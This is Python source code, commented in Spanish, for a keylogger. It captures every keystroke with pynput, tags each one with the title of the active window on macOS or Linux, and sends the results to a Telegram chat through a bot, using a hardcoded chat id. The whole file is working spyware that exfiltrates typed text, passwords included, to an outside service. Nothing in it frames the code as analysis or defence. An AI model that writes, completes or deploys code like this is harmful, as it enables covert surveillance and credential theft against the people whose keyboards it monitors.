import asyncio
from datetime import datetime
from pynput import keyboard
from telegram import Bot
import subprocess
import os

# Inicializar variables globales
active_window_title = None
current_keys = []
is_shift_pressed = False


def get_active_window_title():
    """Obtiene el título de la ventana activa en macOS o Linux."""
    if os.name == "posix":
        if os.uname().sysname == "Darwin":  # macOS
            cmd = ['osascript', '-e',
                   'tell application "System Events" to get name of (processes where frontmost is true)']
            try:
                return subprocess.check_output(cmd).decode().strip()
            except Exception:
                return "Unknown"
        else:  # Linux (requiere `xdotool`)
            try:
                return subprocess.check_output(["xdotool", "getwindowfocus", "getwindowname"]).decode().strip()
            except Exception:
                return "Unknown"
    return "Unknown"


def key_notes(key):
    """Convierte la tecla presionada a texto."""
    if hasattr(key, 'char'):
        return key.char if key.char else "SPECIAL_KEY"
    return str(key)


async def keylog(bot):
    """Envía cada pulsación de tecla a Telegram."""
    global active_window_title, is_shift_pressed, current_keys
    while True:
        await asyncio.sleep(0.1)  # Para evitar una sobrecarga de la CPU
        new_title = get_active_window_title()
        if new_title != active_window_title:
            active_window_title = new_title

        now = datetime.now()
        for k in current_keys:
            message = "[{:02}-{:02}-{:02}] |{}|  ({})".format(
                now.hour,
                now.minute,
                now.second,
                active_window_title.strip(),
                k,
            )
            try:
                await bot.send_message(chat_id="2044147106", text=message)
            except Exception:
                pass
        current_keys = []  # Vaciar lista después de enviar las teclas


def on_press(key):
    """Evento al presionar una tecla."""
    global is_shift_pressed, current_keys
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        is_shift_pressed = True
    else:
        current_keys.append(key_notes(key).upper() if is_shift_pressed else key_notes(key).lower())


def on_release(key):
    """Evento al soltar una tecla."""
    global is_shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        is_shift_pressed = False


def main():
    bot = Bot(token="YOUR_TOKEN")

    # Configurar listener de teclado
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    # Ejecutar keylogger usando asyncio
    asyncio.run(keylog(bot))


if __name__ == "__main__":
    bot = Bot(token="YOUR_TOKEN")  # reemplaza con tu token real
    bot.send_message(chat_id="YOUR_CHAT_ID", text="Mensaje de prueba")
    main()
